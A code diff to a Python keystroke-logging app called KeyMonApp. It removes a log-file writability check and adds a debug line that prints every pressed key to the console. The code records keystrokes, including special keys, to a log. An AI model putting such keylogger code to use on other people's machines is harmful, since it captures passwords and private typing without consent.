@@ -24,19 +24,6 @@ class KeyMonApp:
         self.listener = None
         self.running = False
 
-        # Check if log file can be written
-        self.check_log_file()
-
-    def check_log_file(self):
-        try:
-            with open(log_file, 'a') as f:
-                f.write("Log file initialized.\n")
-            logging.info("Log file check passed.")
-        except Exception as e:
-            logging.error(f"Failed to write to log file: {e}")
-            messagebox.showerror("KeyMon", f"Cannot write to log file: {e}")
-            self.root.quit()
-
     def on_press(self, key):
         try:
             if hasattr(key, 'char') and key.char is not None:
@@ -45,6 +32,7 @@ class KeyMonApp:
                 logging.info(f"Special key pressed: {key}")
         except Exception as e:
             logging.error(f"Error logging key press: {e}")
+        print(f"Key pressed: {key}")  # Debug statement
 
     def start_keylogger(self):
         if not self.running:
